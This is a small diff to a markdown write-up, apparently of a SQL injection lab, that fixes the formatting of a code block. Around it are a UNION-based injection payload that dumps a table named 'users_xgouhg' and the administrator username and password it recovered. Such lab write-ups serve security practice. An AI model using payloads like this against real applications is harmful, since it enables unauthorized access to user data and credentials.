@@ -15,7 +15,8 @@ Look for a non-standard table `users_xgouhg`
 
 >Pets' union select * from users_xgouhg--
 
-```administrator
+```
+administrator
 8bd235i2g39fg3h6865g
 ```
 
